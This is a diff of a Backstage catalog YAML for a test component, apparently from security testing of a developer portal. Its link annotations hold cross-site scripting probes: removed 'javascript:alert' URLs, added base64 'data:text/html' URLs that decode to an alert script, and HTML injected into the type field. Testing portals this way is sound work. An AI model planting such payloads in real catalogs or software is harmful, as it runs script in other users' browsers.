@@ -4,13 +4,8 @@ metadata:
   name: tg-testing
   description: TG Testing Component
   annotations:
-    github.com/project-slug: javascript:alert(1)
-    backstage.io/techdocs-ref: javascript:alert(2)
-    backstage.io/managed-by-location: javascript:alert(3)
-    backstage.io/managed-by-origin-location: javascript:alert(4)
-    backstage.io/view-url: javascript:alert(5)
-    backstage.io/edit-url: javascript:alert(6)
-    backstage.io/source-location: javascript:alert(7)
+    backstage.io/view-url: data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5sb2NhdGlvbik7PC9zY3JpcHQ+
+    backstage.io/edit-url: data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5sb2NhdGlvbik7PC9zY3JpcHQ+
 spec:
   type: website<h1>test</h1>
   owner: user/rhdh-sec-test2
